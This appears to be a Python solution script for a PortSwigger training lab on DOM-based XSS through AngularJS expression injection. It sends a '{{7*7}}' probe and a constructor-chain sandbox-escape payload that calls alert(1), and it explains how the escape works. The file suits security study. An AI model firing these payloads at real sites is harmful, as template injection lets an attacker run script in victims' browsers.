# Lab 11 — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
#
# Vulnerability: Search — AngularJS app (ng-app on body)
# Aim:           Perform DOM XSS that calls alert via AngularJS template injection
#
# Technique:
#   The page has <body ng-app> — AngularJS evaluates {{ }} expressions in the DOM.
#   Input is reflected inside a <span> controlled by ng-app → AngularJS evaluates it.
#
#   Confirm injection with: {{7*7}} → page shows 49
#
#   Sandbox escape using constructor chain:
#     {{constructor.constructor('alert(1)')()}}
#   constructor.constructor is the Function constructor.
#   Calling it with 'alert(1)' builds a Function object, then () invokes it.
#
# ⚠  AngularJS evaluates expressions client-side. We verify the raw payload
#    is reflected into the ng-app scope — execution requires a browser.
#
# Usage: python xss_lab11.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONFIRM_PAYLOAD = "{{7*7}}"
XSS_PAYLOAD     = "{{constructor.constructor('alert(1)')()}}"

if __name__ == "__main__":
    banner()
    section("LAB 11 — DOM XSS: AngularJS EXPRESSION INJECTION")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab11.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # Step 1: confirm AngularJS is active ({{7*7}} should evaluate to 49)
    print(f"  ➜  Confirming AngularJS: sending {CONFIRM_PAYLOAD}\n")
    r = session.get(url, params={"search": CONFIRM_PAYLOAD})
    if "49" in r.text:
        print("  ✔  AngularJS detected — {{7*7}} evaluated to 49")
    else:
        print("  ?  Could not confirm AngularJS evaluation (check in browser)")

    # Step 2: send the sandbox escape payload
    print(f"\n  ➜  Sending sandbox escape payload: {XSS_PAYLOAD}\n")
    r2 = session.get(url, params={"search": XSS_PAYLOAD})
    check_reflection(r2.text, XSS_PAYLOAD, "AngularJS sandbox escape")

    print()
    print("  ➜  Open this URL in a browser — AngularJS evaluates the expression:")
    print(f"     {r2.url}")
    print("  ℹ  constructor.constructor = Function constructor → builds and calls alert(1).")
